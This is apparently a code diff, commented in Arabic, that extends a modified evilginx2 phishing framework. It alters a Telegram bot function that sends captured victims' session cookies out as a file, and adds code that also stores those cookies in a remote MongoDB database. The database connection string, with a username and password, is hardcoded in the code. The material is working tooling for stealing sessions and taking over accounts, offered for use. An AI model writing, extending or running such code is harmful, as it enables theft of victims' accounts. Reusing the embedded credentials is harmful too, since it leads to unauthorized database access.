@@ -13,7 +13,7 @@ import (
 	"github.com/kgretzky/evilginx2/log"
 	"github.com/kgretzky/evilginx2/database" // تأكد من إضافة هذا الاستيراد
 
-    "encoding/json"
+	"encoding/json"
 )
 
 type TelegramBot struct {
@@ -648,10 +648,6 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 		}
 	}
 	
-	// حفظ cookiesList في قاعدة البيانات MongoDB
-	// يتم استدعاء هذه الدالة من core/http_proxy.go، وهناك يتم حفظ الكوكيز في قاعدة البيانات
-	// لذلك لا نحتاج إلى تكرار الحفظ هنا
-	
 	// تحويل قائمة الكوكيز إلى JSON
 	cookiesJSON, err := json.MarshalIndent(cookiesList, "", "  ")
 	if err != nil {
@@ -671,5 +667,31 @@ func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username st
 	
 	// إرسال الملف
 	fileName := fmt.Sprintf("cookies_%s_%s.txt", name, sessionID)
-	return t.SendFileFromText(fileName, cookiesText)
+	err = t.SendFileFromText(fileName, cookiesText)
+	if err != nil {
+		return err
+	}
+	
+	// تحديث قاعدة البيانات بالكوكيز المعالجة
+	// استخدام الطريقة الجديدة SetSessionCookies للتحديث
+
+
+	mongo_uri := "mongodb+srv://jemex2023:l0mwPDO40LYAJ0xs@cluster0.bldhxin.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsInsecure=true&ssl=true"
+	db_name := "evilginx"
+
+	db, err := database.NewMongoDatabase(mongo_uri, db_name)
+	if err != nil {
+		log.Error("فشل في إنشاء اتصال بقاعدة البيانات لتحديث الكوكيز: %v", err)
+		return nil // لا نريد أن نفشل العملية الأساسية إذا فشل تحديث قاعدة البيانات
+	}
+	defer db.Close()
+	
+	err = db.SetSessionCookies(sessionID, cookiesList)
+	if err != nil {
+		log.Error("فشل في تحديث الكوكيز في قاعدة البيانات: %v", err)
+	} else {
+		log.Success("تم تحديث الكوكيز في قاعدة البيانات بنجاح للجلسة: %s", sessionID)
+	}
+	
+	return nil
 }
